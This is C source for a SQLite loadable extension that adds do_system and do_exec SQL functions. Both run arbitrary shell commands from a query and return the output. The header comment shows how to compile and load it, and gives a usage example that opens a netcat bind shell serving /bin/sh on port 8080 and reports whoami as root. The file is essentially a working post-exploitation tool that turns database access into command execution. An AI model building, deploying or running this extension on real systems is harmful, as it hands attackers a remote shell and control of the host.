#include <sqlite3ext.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAX_BUFFER		2048
SQLITE_EXTENSION_INIT1

/*
    gcc -fPIC -shared sql3_udf.c -o sql3_udf.sqlext -lsqlite3

	This can be loaded/used as follows: 
		$ sqlite3 test.db
		sqlite> .load /tmp/sql3_udf.sqlext 
		sqlite> select do_system("nc -lv -p 8080 -e /bin/sh &>/dev/null &");
		0
		sqlite> select do_exec('whoami');
		root
		sqlite>
 */

static void do_exec(
			sqlite3_context *context,
			int argc, 
			sqlite3_value **argv
			)
	{
		FILE *cmd = popen(sqlite3_value_text(argv[0]), "r");
		unsigned int buf_size = 0;
		char line[128]; 
		char *buf = (char*)calloc(MAX_BUFFER, sizeof(char)); 
		
		// read popen output into buffer 
		while(fgets(line, sizeof(line), cmd) != 0){
			size_t len = strlen(line);
			if((buf_size + len) >= MAX_BUFFER){
				break;
			}
			
			strcat(buf, line);
			buf_size += len;
			memset(&line[0], 0, sizeof(line));
		}

		// strip trailing newline
		if ( buf_size > 0 ){
			buf[buf_size-1] = '\0';
		}

		sqlite3_result_text(context, buf, strlen(buf), -1);
		pclose(cmd);
	}

static void do_system(
			sqlite3_context *context,
			int argc,
			sqlite3_value **argv
			)
	{
	    sqlite3_result_int(context, system(sqlite3_value_text(argv[0])));
	}

int sqlite3_extension_init(
			sqlite3 *db,
			char **err,
			const sqlite3_api_routines *api
			)
	{
		SQLITE_EXTENSION_INIT2(api);

		// do_system function
		sqlite3_create_function(db, "do_system", 1, SQLITE_ANY, 0, do_system, 0, 0);
		// do_exec function
		sqlite3_create_function(db, "do_exec", 1, SQLITE_ANY, 0, do_exec, 0, 0);
		return 0;
	}
